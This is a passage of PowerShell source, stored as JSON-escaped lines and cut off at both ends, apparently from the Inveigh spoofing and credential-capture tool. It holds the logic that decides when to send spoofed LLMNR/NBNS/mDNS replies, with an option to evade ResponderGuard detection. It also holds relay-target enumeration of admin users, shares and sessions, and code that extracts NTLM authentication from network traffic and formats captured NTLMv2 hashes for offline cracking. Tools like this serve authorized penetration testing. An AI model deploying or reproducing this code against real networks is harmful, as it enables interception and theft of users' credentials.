")  \u003e $null","        }","","    }","","    $inveigh.console_output = $true","","    if($ConsoleStatus -eq 1)","    {","        $inveigh.output_queue.Add(\"[+] Console Status = $ConsoleStatus Minute\")  \u003e $null","    }","    elseif($ConsoleStatus -gt 1)","    {","        $inveigh.output_queue.Add(\"[+] Console Status = $ConsoleStatus Minutes\")  \u003e $null","    }","","}","else","{","","    if($inveigh.tool -eq 1)","    {","        $inveigh.output_queue.Add(\"[+] Console Output Disabled Due To External Tool Selection\")  \u003e $null","    }","    else","    {","        $inveigh.output_queue.Add(\"[+] Console Output = Disabled\")  \u003e $null","    }","","}","","if($ConsoleUnique -eq 'Y')","{","    $inveigh.console_unique = $true","}","else","{","    $inveigh.console_unique = $false","}","","if($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($Pcap -eq 'File' -and ($PcapTCP -or $PcapUDP)))","{","    ","    if($FileOutput -eq 'Y')","    {","        $inveigh.output_queue.Add(\"[+] File Output = Enabled\")  \u003e $null","        $inveigh.file_output = $true","    }","","    if($Pcap -eq 'File')","    {","        $inveigh.output_queue.Add(\"[+] Pcap Output = File\") \u003e $null","        ","        if($PcapTCP)","        {","            $inveigh.output_queue.Add(\"[+] Pcap TCP Ports = \" + ($PcapTCP -join \",\"))  \u003e $null","        }","","        if($PcapUDP)","        {","            $inveigh.output_queue.Add(\"[+] Pcap UDP Ports = \" + ($PcapUDP -join \",\"))  \u003e $null","        }","","    }","","    $inveigh.output_queue.Add(\"[+] Output Directory = $output_directory\")  \u003e $null ","}","else","{","    $inveigh.output_queue.Add(\"[+] File Output = Disabled\")  \u003e $null","}","","if($Pcap -eq 'Memory')","{","    $inveigh.output_queue.Add(\"[+] Pcap Output = Memory\")","}","","if($FileUnique -eq 'Y')","{","    $inveigh.file_unique = $true","}","else","{","    $inveigh.file_unique = $false","}","","if($LogOutput -eq 'Y')","{","    $inveigh.log_output = $true","}","else","{","    $inveigh.log_output = $false","}","","if($RunCount)","{","    $inveigh.output_queue.Add(\"[+] Run Count = $RunCount\") \u003e $null","}","","if($RunTime -eq 1)","{","    $inveigh.output_queue.Add(\"[+] Run Time = $RunTime Minute\")  \u003e $null","}","elseif($RunTime -gt 1)","{","    $inveigh.output_queue.Add(\"[+] Run Time = $RunTime Minutes\")  \u003e $null","}","","if($ShowHelp -eq 'Y')","{","    $inveigh.output_queue.Add(\"[!] Run Stop-Inveigh to stop\")  \u003e $null","","    if($inveigh.console_output)","    {","        $inveigh.output_queue.Add(\"[*] Press any key to stop console output\")  \u003e $null","    }","","}","","while($inveigh.output_queue.Count -gt 0)","{","","    switch -Wildcard ($inveigh.output_queue[0])","    {","","        {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}","        {","","            if($inveigh.status_output -and $inveigh.output_stream_only)","            {","                Write-Output($inveigh.output_queue[0] + $inveigh.newline)","            }","            elseif($inveigh.status_output)","            {","                Write-Warning($inveigh.output_queue[0])","            }","","            if($inveigh.file_output)","            {","                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) \u003e $null","            }","","            if($inveigh.log_output)","            {","                $inveigh.log.Add($inveigh.output_queue[0]) \u003e $null","            }","","            $inveigh.output_queue.RemoveAt(0)","        }","","        default","        {","","            if($inveigh.status_output -and $inveigh.output_stream_only)","            {","                Write-Output($inveigh.output_queue[0] + $inveigh.newline)","            }","            elseif($inveigh.status_output)","            {","                Write-Output($inveigh.output_queue[0])","            }","","            if($inveigh.file_output)","            {","","                if ($inveigh.output_queue[0].StartsWith(\"[+] \") -or $inveigh.output_queue[0].StartsWith(\"[*] \"))","                {","                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) \u003e $null","                }","                else","                {","                    $inveigh.log_file_queue.Add(\"[redacted]\") \u003e $null    ","                }","","            }","","            if($inveigh.log_output)","            {","                $inveigh.log.Add($inveigh.output_queue[0]) \u003e $null","            }","","            $inveigh.output_queue.RemoveAt(0)","        }","","    }","","}","","$inveigh.status_output = $false","","#endregion","#region begin script blocks","","# Shared Basic Functions ScriptBlock","$shared_basic_functions_scriptblock =","{","","    function Get-UInt16DataLength","    {","        param ([Int]$Start,[Byte[]]$Data)","        $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)","","        return $data_length","    }","","    function Get-UInt32DataLength","    {","        param ([Int]$Start,[Byte[]]$Data)","","        $data_length = [System.BitConverter]::ToUInt32($Data[$Start..($Start + 3)],0)","","        return $data_length","    }","","    function Convert-DataToString","    {","        param ([Int]$Start,[Int]$Length,[Byte[]]$Data)","","        $string_data = [System.BitConverter]::ToString($Data[$Start..($Start + $Length - 1)])","        $string_data = $string_data -replace \"-00\",\"\"","        $string_data = $string_data.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}","        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)","","        return $string_extract","    }","","    function Convert-DataToUInt16($field)","    {","\t   [Array]::Reverse($field)","\t   return [System.BitConverter]::ToUInt16($field,0)","    }","","    function Convert-DataToUInt32($field)","    {","\t   [Array]::Reverse($field)","\t   return [System.BitConverter]::ToUInt32($field,0)","    }","","    function Get-SpooferResponseMessage","    {","        param ([String]$QueryString,[String]$Type,[String]$mDNSType,[String]$Enabled,[byte]$NBNSType)","","        if($QueryString -like \"*.*\")","        {","            [Array]$query_split = $QueryString.Split('.')","            $query_host = $query_split[0]","        }","","        $response_type = \"[+]\"","","        if($Inspect)","        {","            $response_message = \"[inspect only]\"","        }","        elseif($Enabled -eq 'N')","        {","            $response_message = \"[spoofer disabled]\"","        }","        elseif($SpooferHostsReply -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))","        {","            $response_message = \"[$QueryString not on reply list]\"","        }","        elseif($SpooferHostsIgnore -contains $QueryString -or $SpooferHostsIgnore -contains $query_host)","        {","            $response_message = \"[$QueryString is on ignore list]\"","        }","        elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)","        {","            $response_message = \"[$source_IP not on reply list]\"","        }","        elseif($SpooferIPsIgnore -contains $source_IP)","        {","            $response_message = \"[$source_IP is on ignore list]\"","        }","        elseif($inveigh.valid_host_list -contains $query_string -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))","        {","            $response_message = \"[$query_string is a valid host]\"","        }","        elseif($SpooferRepeat -eq 'Y' -and $inveigh.IP_capture_list -contains $source_IP.IPAddressToString)","        {","            $response_message = \"[previous $source_IP capture]\"","        }","        elseif($Type -eq 'NBNS' -and $source_IP.IPAddressToString -eq $IP)","        {","            $response_message = \"[local query]\"","        }","        elseif($SpooferLearning -eq 'Y' -or $SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)","        {","            $response_message = \": \" + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + \" minute(s) until spoofing starts\"","        }","        elseif($Type -eq 'NBNS' -and $NBNSTypes -notcontains $NBNS_query_type)","        {","            $response_message = \"[NBNS type disabled]\"","        }","        elseif($Type -eq 'NBNS' -and $NBNSType -eq 33)","        {","            $response_message = \"[NBSTAT request]\"","        }","        elseif($EvadeRG -eq 'Y' -and $Type -ne 'mDNS' -and $Type -ne 'DNS' -and $destination_IP.IPAddressToString -eq $IP)","        {","            $response_message = \"[possible ResponderGuard request ignored]\"","            $response_type = \"[!]\"","        }","        elseif($Type -eq 'mDNS' -and $mDNSType -and $mDNSTypes -notcontains $mDNSType)","        {","            $response_message = \"[mDNS type disabled]\"","        }","        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdHost -gt 0 -and @($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count -le $SpooferThresholdHost)","        {","            $response_message = \"[SpooferThresholdHost \u003e= $(@($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count)]\"","        }","        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdNetwork -gt 0 -and @($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count -le $SpooferThresholdNetwork)","        {","            $response_message = \"[SpooferThresholdNetwork \u003e= $(@($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count)]\"","        }","        elseif($QueryString -match '[^\\x00-\\x7F]+')","        {","            $response_message = \"[nonprintable characters]\"","        }","        else","        {","            $response_message = \"[response sent]\"","        }","","        return $response_type,$response_message","    }","","    function Get-NBNSQueryType([String]$NBNSQueryType)","    {","","        switch ($NBNSQueryType)","        {","","            '41-41'","            {","                $NBNS_query_type = \"00\"","            }","","            '41-42'","            {","                $NBNS_query_type = \"01\"","            }","","            '41-43'","            {","                $NBNS_query_type = \"02\"","            }","","            '41-44'","            {","                $NBNS_query_type = \"03\"","            }","","            '43-41'","            {","                $NBNS_query_type = \"20\"","            }","","            '42-4C'","            {","                $NBNS_query_type = \"1B\"","            }","","            '42-4D'","            {","                $NBNS_query_type = \"1C\"","            }","","            '42-4E'","            {","                $NBNS_query_type = \"1D\"","            }","","            '42-4F'","            {","                $NBNS_query_type = \"1E\"","            }","","        }","","        return $NBNS_query_type","    }","","    function Get-NameQueryString([Int]$Index, [Byte[]]$NameQuery)","    {","        $segment_length = $NameQuery[12]","","        if($segment_length -gt 0)","        {","            $i = 0","            $name_query_string = ''","","            do","            {","                $name_query_string += [System.Text.Encoding]::UTF8.GetString($NameQuery[($Index + 1)..($Index + $segment_length)])","                $Index += $segment_length + 1","                $segment_length = $NameQuery[$Index]","                $i++","","                if($segment_length -gt 0)","                {","                    $name_query_string += \".\"","                }","","            }","            until($segment_length -eq 0 -or $i -eq 127)","            ","        }","","        return $name_query_string","    }","","    function ConvertFrom-PacketOrderedDictionary","    {","        param($packet_ordered_dictionary)","","        foreach($field in $packet_ordered_dictionary.Values)","        {","            $byte_array += $field","        }","","        return $byte_array","    }","","    function New-RelayEnumObject","    {","        param ($IP,$Hostname,$Sessions,$AdministratorUsers,$AdministratorGroups,$Privileged,$Shares,$NetSessions,$NetSessionsMapped,","        $LocalUsers,$SMB2,$Signing,$SMBServer,$Targeted,$Enumerate,$Execute)","","        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}","        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}","        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}","        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}","        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}","        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}","        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}","        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}","","        $relay_object = New-Object PSObject","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Index\" $inveigh.enumerate.Count","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"IP\" $IP","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Hostname\" $Hostname","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Sessions\" $Sessions","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Users\" $AdministratorUsers","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Groups\" $AdministratorGroups","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Privileged\" $Privileged","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Shares\" $Shares","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions\" $NetSessions","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions Mapped\" $NetSessionsMapped","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Local Users\" $LocalUsers","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB2.1\" $SMB2","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Signing\" $Signing","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB Server\" $SMBServer","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Targeted\" $Targeted","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Enumerate\" $Enumeration","        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Execute\" $Execution","","        return $relay_object","    }","","    function Invoke-SessionUpdate","    {","        param ([String]$domain,[String]$username,[String]$hostname,[String]$IP)","","        if($inveigh.domain_mapping_table.$domain)","        {","            $session = ($username + \"@\" + $inveigh.domain_mapping_table.$domain).ToUpper()","            $hostname_full = ($hostname + \".\" + $inveigh.domain_mapping_table.$domain).ToUpper()","        }","        else","        {","            $session = $domain + \"\\\" + $username","        }","","        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)","        {","","            if($inveigh.enumerate[$i].Hostname -eq $hostname_full -or $inveigh.enumerate[$i].IP -eq $IP)","            {","","                if(!$inveigh.enumerate[$i].Hostname)","                {","                    $inveigh.enumerate[$target_index].Hostname = $hostname_full","                }","","                [Array]$session_list = $inveigh.enumerate[$i].Sessions","","                if($inveigh.domain_mapping_table.$domain)","                {","","                    for($j = 0;$j -lt $session_list.Count;$j++)","                    {","","                        if($session_list[$j] -like \"$domain\\*\")","                        {","                            $session_username = ($session_list[$j].Split(\"\\\"))[1]","                            $session_update = $session_username + \"@\" + $inveigh.domain_mapping_table.$domain","                            $session_list[$j] += $session_update","                            $inveigh.enumerate[$i].Sessions = $session_list","                        }","","                    }","","                }","","                if($session_list -notcontains $session)","                {","                    $session_list += $session","                    $inveigh.enumerate[$i].Sessions = $session_list","                }","","                $target_updated = $true","                break","            }","","        }","     ","        if(!$target_updated)","        {","            $inveigh.enumerate.Add((New-RelayEnumObject -IP $IP -Hostname $hostname_full -Sessions $session)) \u003e $null","        }","","    }","","    ","","}","","# NTLM_functions_scriptblock","$NTLM_functions_scriptblock =","{","","    function Get-NTLMResponse","    {","        param ([Byte[]]$Payload,[String]$Capture,[String]$SourceIP,[String]$SourcePort,[String]$Port,[String]$Protocol)","","        $payload_converted = [System.BitConverter]::ToString($Payload)","        $payload_converted = $payload_converted -replace \"-\",\"\"","        $NTLMSSP_hex_offset = $payload_converted.IndexOf(\"4E544C4D53535000\")","        $session = \"$SourceIP`:$SourcePort\"","","        if($NTLMSSP_hex_offset -ge 0 -and $payload_converted.SubString(($NTLMSSP_hex_offset + 16),8) -eq \"03000000\")","        {","            $NTLMSSP_offset = $NTLMSSP_hex_offset / 2","            $LM_length = Get-UInt16DataLength ($NTLMSSP_offset + 12) $Payload","            $LM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 16) $Payload","            $LM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $LM_offset)..($NTLMSSP_offset + $LM_offset + $LM_length - 1)]) -replace \"-\",\"\"","            $NTLM_length = Get-UInt16DataLength ($NTLMSSP_offset + 20) $Payload","            $NTLM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 24) $Payload","            $NTLM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace \"-\",\"\"","            $domain_length = Get-UInt16DataLength ($NTLMSSP_offset + 28) $Payload","            $domain_offset = Get-UInt32DataLength ($NTLMSSP_offset + 32) $Payload","","            if($domain_length -gt 0)","            {","                $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload","            }","","            $user_length = Get-UInt16DataLength ($NTLMSSP_offset + 36) $Payload","            $user_offset = Get-UInt32DataLength ($NTLMSSP_offset + 40) $Payload","            $NTLM_user_string = Convert-DataToString ($NTLMSSP_offset + $user_offset) $user_length $Payload","            $host_length = Get-UInt16DataLength ($NTLMSSP_offset + 44) $Payload","            $host_offset = Get-UInt32DataLength ($NTLMSSP_offset + 48) $Payload","            $NTLM_host_string = Convert-DataToString ($NTLMSSP_offset + $host_offset) $host_length $Payload","","            if($Protocol -eq \"SMB\")","            {","                $NTLM_challenge = $inveigh.SMB_session_table.$session","            }","            else","            {","                $NTLM_challenge = $inveigh.HTTP_session_table.$session","            }","            ","            if($NTLM_length -gt 24)","            {","","                if($NTLM_challenge)","                {","","                    $NTLMv2_response = $NTLM_response.Insert(32,':')","                    $NTLMv2_hash = $NTLM_user_string + \"::\" + $NTLM_domain_string + \":\" + $NTLM_challenge + \":\" + $NTLMv2_response","","                    if($Capture -eq 'Y')","                    {","","                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))","                        {","                            $inveigh.NTLMv2_list.Add($NTLMv2_hash) \u003e $null","","                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\"))","                            {","                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:\") \u003e $null","                                $inveigh.output_queue.Add($NTLMv2_hash) \u003e $null","                            }","                            else","                            {","                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]\") \u003e $null","                            }","","                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\")))","                            {","                                $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) \u003e $null","                                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 written to \" + \"Inveigh-NTLMv2.txt\") \u003e $null","                            }","","                            if($inveigh.NTLMv2_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\")","                            {","                                $inveigh.NTLMv2_username_list.Add(\"$SourceIP $NTLM_domain_string\\$NTLM_user_string\") \u003e $null","                            }","","                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)","                            {","                                $inveigh.IP_capture_list.Add($SourceIP) \u003e $null","                            }","","                        }","                        else","                        {","                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]\") \u003e $null    ","                        }","","                    }","                    else","                    {","                        $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]\") \u003e $null    ","                    }","","                }","                else","                {","                    $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge missing for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort\") \u003e $null    ","                }","","            }","            elseif($NTLM_length -eq 24)","            {","","                if($NTLM_challenge)","                {","","                    $NTLMv1_